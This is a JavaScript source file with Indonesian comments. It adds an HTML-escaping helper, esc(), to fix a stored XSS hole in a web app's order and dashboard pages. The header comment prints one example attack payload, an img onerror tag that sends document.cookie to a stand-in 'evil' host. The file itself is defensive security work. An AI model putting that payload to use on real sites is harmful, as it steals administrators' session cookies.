// public/assets/escape.js
//
// B9 — Escaping HTML untuk data yang berasal dari basis data.
//
// MASALAH: `public/app.js`, `public/index.html`, dan `public/pay.html`
// membangun antarmuka dengan `innerHTML` dan menyuntikkan nilai dari
// respon API secara mentah, misalnya:
//
//     <td>${o.customer_name}</td>
//
// `customer_name` berasal dari `users.full_name` yang diisi bebas saat
// registrasi (`_validate.js` hanya memotong karakter kontrol dan panjang,
// TIDAK menghapus tanda `<`, `>`, atau `"`). Jadi siapa pun bisa mendaftar
// dengan nama:
//
//     <img src=x onerror="fetch('https://evil/?c='+document.cookie)">
//
// dan skrip itu akan berjalan di browser setiap Admin/Owner/Staff yang
// membuka halaman Pesanan atau Dashboard — sebuah stored XSS yang menarget
// akun paling berkuasa di aplikasi.
//
// SOLUSI: satu helper `esc()` yang dipakai di SETIAP titik penyuntikan.
// Dipasang sebagai berkas tersendiri supaya ketiga berkas pemakai berbagi
// satu definisi (dan tidak ada tiga salinan yang bisa menyimpang).

(function (global) {
  'use strict';

  var ENTITIES = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  };

  /**
   * Ubah nilai apa pun menjadi teks yang aman disisipkan ke HTML.
   *
   * Aman dipakai di dua posisi berbeda:
   *   - isi elemen:  <td>${esc(v)}</td>
   *   - nilai atribut ber-tanda kutip ganda: data-name="${esc(v)}"
   *     (tanda kutip ikut di-escape, jadi tidak bisa lari dari atribut)
   *
   * Mengembalikan '' untuk null/undefined supaya tidak ada "null"/"undefined"
   * yang tercetak di antarmuka.
   *
   * @param {*} value
   * @returns {string}
   */
  function esc(value) {
    if (value === null || value === undefined) return '';
    return String(value).replace(/[&<>"']/g, function (ch) {
      return ENTITIES[ch];
    });
  }

  global.esc = esc;

  // Untuk pengujian di Node (tools/verify_b9.mjs membaca berkas ini dan
  // mengeksekusinya dengan objek global tiruan).
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = { esc: esc };
  }
})(typeof window !== 'undefined' ? window : globalThis);
